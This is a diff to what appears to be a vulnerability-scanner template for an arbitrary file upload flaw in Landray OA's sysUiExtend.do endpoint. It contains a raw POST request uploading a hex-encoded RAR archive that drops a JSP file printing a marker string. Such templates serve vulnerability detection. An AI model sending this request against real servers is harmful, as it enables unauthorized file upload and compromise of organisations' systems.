@@ -3,12 +3,8 @@ info:
   name: 蓝凌OA sysUiExtend.do 任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lhiw2w19g7tzg0dq'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: lhiw2w19g7tzg0dq
-    fofa: app="Landray-OA系统"
 http:
 - raw:
   - 'POST /api///sys/ui/sys_ui_extend/sysUiExtend.do?method=getThemeInfo HTTP/1.1
@@ -29,8 +25,6 @@ http:
     X-Requested-With: XMLHttpRequest
 
 
-
-
     -----------------------------260140030128010173621878123124
 
 
@@ -38,8 +32,6 @@ http:
 
 
     Content-Type: application/octet-stream
-
-
 
 
     $<Stream>0x526172211A0700CF907300000D0000000000000005AD7420902B00260000002A00000002AB984EA5696D3D581D3306002000000075692E696E6900B0EF88480D0108FE8CB7B255254C5B3FE4A601880FF1124111D9F359070482E9077A6EA9C68FCAFAFD20E4D674209031001D0000001D00000002563F7118856D3D581D300C002000000064756465736974652E6A737000B01A74443C25206F75742E7072696E746C6E2822647564657369746522293B253EC43D7B00400700</Stream>$
